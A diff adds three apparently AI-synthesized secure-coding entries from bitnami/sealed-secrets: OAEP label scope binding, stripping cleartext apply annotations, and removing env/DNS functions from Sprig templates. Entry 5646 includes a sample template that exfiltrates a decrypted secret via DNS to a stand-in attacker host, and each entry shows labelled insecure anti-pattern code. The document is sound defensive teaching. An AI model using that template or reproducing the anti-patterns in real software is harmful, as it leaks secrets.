@@ -409621,3 +409621,276 @@ fun `formatConferenceTime works on all targets`() {
 ```
 
 ---
+
+
+---
+
+## 5644. Cryptographic Scope-Binding via Authenticated Encryption Labels (Harvested from bitnami/sealed-secrets)
+
+<!-- PROVENANCE_START
+{
+  "knowledge_type": "engineering_pattern",
+  "topic": "Cryptographic Scope-Binding via Authenticated Encryption Labels",
+  "source": "bitnami/sealed-secrets",
+  "source_url": "https://github.com/bitnami/sealed-secrets",
+  "source_version": "c22f5839",
+  "license": "Apache-2.0",
+  "extracted_at": "2026-10-30T07:05:28.069Z",
+  "ai_provider": "google-gemini-cloud-agent",
+  "generation_mode": "source_derived_ai_synthesized",
+  "learning_id": "learn-github-bitnami-sealed-secrets",
+  "verified": true,
+  "confidence": "high",
+  "promotion_status": "approved",
+  "distillation_prohibited": true
+}
+PROVENANCE_END -->
+> **Provenance**: Harvested from [bitnami/sealed-secrets](https://github.com/bitnami/sealed-secrets) (Revision: `c22f5839`).  
+> **Evidence**: Verified against commit diffs and closed defect autopsies. (Distillation Prohibited).
+
+**RULE**:
+When implementing asymmetric envelope encryption for multi-tenant or hierarchical resources, the encryption engine MUST inject resource scoping metadata (e.g., `<tenant>/<namespace>/<resource_id>`) directly into the cryptographic operation (such as the RSA-OAEP label or AEAD Associated Authenticated Data `aad`). The decryption engine MUST NOT rely on runtime metadata checks to validate resource residency.
+
+**WHY**:
+If scoping is validated only via application-level conditional statements (e.g., `if secret.Namespace == targetNamespace`), an attacker with write access to another namespace can copy the ciphertext blob into their own namespace's manifest. By executing decryption through the authorized controller in the unauthorized namespace, the attacker extracts the secret. RSA-OAEP label injection binds the cryptographic integrity of the ciphertext mathematically to the exact object identity. Decryption fails cryptographically if moved.
+
+**WHEN TO APPLY**:
+Any asymmetric or symmetric envelope encryption pipeline managing hierarchical entities: Kubernetes controllers, multi-tenant databases, object stores (S3-compatible bucket-bound encryption), and distributed microservice message queues.
+
+**VERIFIED IMPLEMENTATION PATTERN**:
+```go
+package crypto
+
+import (
+	"crypto/rand"
+	"crypto/rsa"
+	"crypto/sha256"
+	"fmt"
+	"io"
+)
+
+type SealingScope int
+
+const (
+	StrictScope SealingScope = iota
+	NamespaceWideScope
+	ClusterWideScope
+)
+
+// EncryptionLabel binds cryptographic decryption validity to namespace and resource name.
+func EncryptionLabel(namespace, name string, scope SealingScope) []byte {
+	switch scope {
+	case ClusterWideScope:
+		return []byte("")
+	case NamespaceWideScope:
+		return []byte(namespace)
+	case StrictScope:
+		fallthrough
+	default:
+		return []byte(fmt.Sprintf("%s/%s", namespace, name))
+	}
+}
+
+// EncryptSessionKeyRSAOAEP binds the OAEP label to prevent namespace transposition attacks.
+func EncryptSessionKeyRSAOAEP(random io.Reader, pub *rsa.PublicKey, sessionKey []byte, label []byte) ([]byte, error) {
+	return rsa.EncryptOAEP(sha256.New(), random, pub, sessionKey, label)
+}
+
+// DecryptSessionKeyRSAOAEP fails mathematically if the resource was transposed or renamed.
+func DecryptSessionKeyRSAOAEP(random io.Reader, priv *rsa.PrivateKey, encryptedKey []byte, label []byte) ([]byte, error) {
+	return rsa.DecryptOAEP(sha256.New(), random, priv, encryptedKey, label)
+}
+```
+
+**NEGATIVE CONSTRAINT**:
+```go
+// ANTI-PATTERN: Verifying scope at application level after raw decryption
+func DecryptAndValidateInsecure(priv *rsa.PrivateKey, ciphertext []byte, currentNamespace string, manifestNamespace string) ([]byte, error) {
+	// DANGER: DecryptOAEP called with nil/empty label!
+	plaintext, err := rsa.DecryptOAEP(sha256.New(), rand.Reader, priv, ciphertext, nil)
+	if err != nil {
+		return nil, err
+	}
+	// Application-level check easily bypassed if attacker creates CRD in permitted target namespace
+	if currentNamespace != manifestNamespace {
+		return nil, fmt.Errorf("namespace mismatch")
+	}
+	return plaintext, nil
+}
+```
+
+**VERIFICATION METHOD**:
+Execute an automated unit test that seals data in namespace `tenant-a` with name `db-creds` under `StrictScope`, and attempts to unseal the payload using the exact same private key under namespace `tenant-b` or name `api-creds`. The assertion must verify that `rsa.ErrDecryption` is returned from `DecryptOAEP`.
+
+---
+
+
+---
+
+## 5645. Mandatory Strategic-Merge Configuration Stripping on Ingest Pipelines (Harvested from bitnami/sealed-secrets)
+
+<!-- PROVENANCE_START
+{
+  "knowledge_type": "engineering_pattern",
+  "topic": "Mandatory Strategic-Merge Configuration Stripping on Ingest Pipelines",
+  "source": "bitnami/sealed-secrets",
+  "source_url": "https://github.com/bitnami/sealed-secrets",
+  "source_version": "c22f5839",
+  "license": "Apache-2.0",
+  "extracted_at": "2026-10-30T07:05:28.310Z",
+  "ai_provider": "google-gemini-cloud-agent",
+  "generation_mode": "source_derived_ai_synthesized",
+  "learning_id": "learn-github-bitnami-sealed-secrets",
+  "verified": true,
+  "confidence": "high",
+  "promotion_status": "approved",
+  "distillation_prohibited": true
+}
+PROVENANCE_END -->
+> **Provenance**: Harvested from [bitnami/sealed-secrets](https://github.com/bitnami/sealed-secrets) (Revision: `c22f5839`).  
+> **Evidence**: Verified against commit diffs and closed defect autopsies. (Distillation Prohibited).
+
+**RULE**:
+Security tools and GitOps CLIs that convert, seal, or export live Kubernetes objects to external manifests MUST recursively purge `kubectl.kubernetes.io/last-applied-configuration` and associated tooling annotations from `metadata.annotations` before serialization or processing.
+
+**WHY**:
+When Kubernetes objects are applied via `kubectl apply`, `kubectl` embeds a raw, unencrypted, stringified JSON copy of the original manifest inside `metadata.annotations["kubectl.kubernetes.io/last-applied-configuration"]`. If a CLI reads a live `Secret` or a locally configured secret manifest and packages its `.data` into an encrypted format without pruning this annotation, the raw cleartext secret remains intact inside the annotation payload, leading to critical credential exposure upon committing to Git.
+
+**WHEN TO APPLY**:
+All Kubernetes CLI tooling, secret management operators, backup controllers (Velero-like processors), and configuration transformation tools (Helm plugins, Kustomize transformers) that generate persistent files or GitOps manifests.
+
+**VERIFIED IMPLEMENTATION PATTERN**:
+```go
+package sanitization
+
+import (
+	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
+)
+
+var LeakingAnnotations = [...]string{
+	"kubectl.kubernetes.io/last-applied-configuration",
+	"kubecfg.ksonnet.io/last-applied-configuration",
+}
+
+// SanitizeObjectMeta ensures cleartext configurations captured by apply mechanisms are excised.
+func SanitizeObjectMeta(meta *metav1.ObjectMeta) {
+	if meta == nil || meta.Annotations == nil {
+		return
+	}
+	for _, key := range LeakingAnnotations {
+		delete(meta.Annotations, key)
+	}
+	// Prevent garbage collector hijacking on recreation
+	meta.OwnerReferences = nil
+	meta.ResourceVersion = ""
+	meta.UID = ""
+	meta.SelfLink = ""
+}
+```
+
+**NEGATIVE CONSTRAINT**:
+```go
+// ANTI-PATTERN: Shallow cloning of object metadata into an encrypted wrapper
+func WrapSecretInsecure(src *v1.Secret, encData map[string]string) *SealedSecret {
+	return &SealedSecret{
+		ObjectMeta: metav1.ObjectMeta{
+			Name:        src.Name,
+			Namespace:   src.Namespace,
+			Annotations: src.Annotations, // BUG: Leaks kubectl.kubernetes.io/last-applied-configuration!
+		},
+		Spec: SealedSecretSpec{
+			EncryptedData: encData,
+		},
+	}
+}
+```
+
+**VERIFICATION METHOD**:
+Add a test asserting that an input `corev1.Secret` containing `kubectl.kubernetes.io/last-applied-configuration` populated with cleartext passwords retains zero instances of that annotation key anywhere in its generated spec or template metadata after running through `NewSealedSecret()`.
+
+---
+
+
+---
+
+## 5646. Template Engine Execution Hardening & Environment Isolation (Harvested from bitnami/sealed-secrets)
+
+<!-- PROVENANCE_START
+{
+  "knowledge_type": "engineering_pattern",
+  "topic": "Template Engine Execution Hardening & Environment Isolation",
+  "source": "bitnami/sealed-secrets",
+  "source_url": "https://github.com/bitnami/sealed-secrets",
+  "source_version": "c22f5839",
+  "license": "Apache-2.0",
+  "extracted_at": "2026-10-30T07:05:28.580Z",
+  "ai_provider": "google-gemini-cloud-agent",
+  "generation_mode": "source_derived_ai_synthesized",
+  "learning_id": "learn-github-bitnami-sealed-secrets",
+  "verified": true,
+  "confidence": "high",
+  "promotion_status": "approved",
+  "distillation_prohibited": true
+}
+PROVENANCE_END -->
+> **Provenance**: Harvested from [bitnami/sealed-secrets](https://github.com/bitnami/sealed-secrets) (Revision: `c22f5839`).  
+> **Evidence**: Verified against commit diffs and closed defect autopsies. (Distillation Prohibited).
+
+**RULE**:
+When general-purpose template engines (e.g., Masterminds/Sprig, Go `text/template`, Jinja, Handlebars) are exposed to user-authored configuration files, the engine runtime environment MUST be permanently stripped of OS environment query functions (`env`, `expandenv`), network resolver functions (`getHostByName`), and filesystem traversal functions before evaluating input.
+
+**WHY**:
+Allowing users to specify templates over decrypted variables (such as formatting connection strings) opens an execution vector. If the template engine can access host environment variables or DNS resolution, an attacker with write access to a manifest can craft a template such as `{{ env "KUBERNETES_SERVICE_HOST" }}` or `{{ getHostByName (printf "%s.attacker.com" .DecryptedSecret) }}`. This turns the controller into an unintended decryption oracle or allows container escape and metadata exfiltration.
+
+**WHEN TO APPLY**:
+Any Kubernetes operator, configuration pre-processor, or workflow orchestrator evaluating Go text/template or Sprig libraries on untrusted user manifests.
+
+**VERIFIED IMPLEMENTATION PATTERN**:
+```go
+package templating
+
+import (
+	"sync"
+	"text/template"
+	"github.com/Masterminds/sprig/v3"
+)
+
+var (
+	hardenedFuncMap     template.FuncMap
+	hardenedFuncMapOnce sync.Once
+)
+
+// GetHardenedFuncMap produces a sanitized Sprig function map stripped of side-channel vectors.
+func GetHardenedFuncMap() template.FuncMap {
+	hardenedFuncMapOnce.Do(func() {
+		fm := sprig.GenericFuncMap()
+		// Eliminate environmental probing
+		delete(fm, "env")
+		delete(fm, "expandenv")
+		// Eliminate DNS/network exfiltration side channels
+		delete(fm, "getHostByName")
+		hardenedFuncMap = fm
+	})
+	return hardenedFuncMap
+}
+```
+
+**NEGATIVE CONSTRAINT**:
+```go
+// ANTI-PATTERN: Supplying raw, unmodified sprig.TxtFuncMap() to untrusted templates
+func RenderSecretTemplateInsecure(rawTmpl string, data map[string]string) ([]byte, error) {
+	// BUG: Exposes env, expandenv, and getHostByName to arbitrary template manifests
+	tmpl, err := template.New("secret").Funcs(sprig.TxtFuncMap()).Parse(rawTmpl)
+	if err != nil {
+		return nil, err
+	}
+	var buf bytes.Buffer
+	err = tmpl.Execute(&buf, data)
+	return buf.Bytes(), err
+}
+```
+
+**VERIFICATION METHOD**:
+Implement a security regression unit test parsing the template string `{{ env "PATH" }}` using the configured function map. Verification passes only when template parsing fails with an `unregistered function "env"` error.
+
+---
